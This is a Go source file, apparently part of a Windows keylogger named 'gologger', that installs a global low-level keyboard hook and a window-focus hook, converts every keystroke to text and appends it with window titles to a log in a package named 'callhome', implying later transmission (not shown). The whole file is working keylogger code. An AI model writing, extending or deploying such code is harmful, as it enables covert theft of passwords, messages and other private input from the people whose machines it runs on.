package logger

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/vgo0/gologger/callhome"
	"github.com/vgo0/gologger/winapi"
	"github.com/vgo0/gologger/wintypes"
)

var (
	keyboardHook      wintypes.HHOOK
	windowSwitchHook  wintypes.HWINEVENTHOOK
	attachMap                               = make(map[wintypes.DWORD]bool)
	titleMap                                = make(map[wintypes.DWORD]string)
	winChangeCallback wintypes.WINEVENTPROC = windowChangeCallback
	keyCallback       wintypes.HOOKPROC     = keyPressCallback
)

/*
Handles window switching events

Used to denote currently active window within the log and call AttachThreadInput

AttachThreadInput is required to get an active keyboard state for use in ToAscii in our logging thread

More details about this are in the readme

Potentially could be improved by periodically clearing out the mappings

Some windows return empty title bars - currently these are just returned as Unknown - could also be investigated
*/
func windowChangeCallback(hWinEventHook wintypes.HWINEVENTHOOK, event wintypes.DWORD, hwnd wintypes.HWND,
	idObject wintypes.LONG, idChild wintypes.LONG, idEventThread wintypes.DWORD,
	dwmsEventTime wintypes.DWORD) uintptr {

	// If we haven't previously called AttachThreadInput - do so
	if _, ok := attachMap[idEventThread]; !ok {
		winapi.AttachThreadInput(winapi.GetCurrentThreadId(), idEventThread, wintypes.BOOL(1))
		attachMap[idEventThread] = true
		titleMap[idEventThread] = fmt.Sprintf("[%s]", winapi.GetWindowText(hwnd))
	}

	callhome.Log += fmt.Sprintf("%s\n", titleMap[idEventThread])

	return uintptr(0)
}

/*
Handles callbacks for low level keyboard events

Resolves keypress to printable ascii character and appends to log
*/
func keyPressCallback(nCode int, wparam wintypes.WPARAM, lparam wintypes.LPARAM) wintypes.LRESULT {
	// Based on KEYUP events as that should be more reliable for how the resulting text actually looks
	if nCode >= 0 && wparam == wintypes.WPARAM(wintypes.WM_KEYUP) {
		// Resolve struct that holds real event data
		kbdstruct := (*wintypes.KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))

		lpkbs := [256]byte{}

		winapi.GetKeyboardState(&lpkbs)

		var lpChar [1]uint16
		winapi.ToAscii(kbdstruct.VkCode, kbdstruct.ScanCode, &lpkbs, &lpChar[0], 0)

		if lpChar[0] > 0 {
			callhome.Log += syscall.UTF16ToString(lpChar[:])
		}
	}
	return winapi.CallNextHookEx(keyboardHook, nCode, wparam, lparam)
}

/*
Attaches our initial hooks and runs the message queue
*/
func Start() {
	windowSwitchHook = winapi.SetWinEventHook(
		wintypes.EVENT_OBJECT_FOCUS,
		wintypes.EVENT_OBJECT_FOCUS,
		0,
		winChangeCallback,
		0,
		0,
		0|2,
	)

	keyboardHook = winapi.SetWindowsHookEx(
		wintypes.WH_KEYBOARD_LL,
		keyCallback,
		0,
		0,
	)

	var msg wintypes.MSG
	for winapi.GetMessage(&msg, 0, 0, 0) != 0 {
		winapi.TranslateMessage(&msg)
		winapi.DispatchMessage(&msg)
	}

	winapi.UnhookWindowsHookEx(keyboardHook)
	winapi.UnhookWinEvent(windowSwitchHook)
}
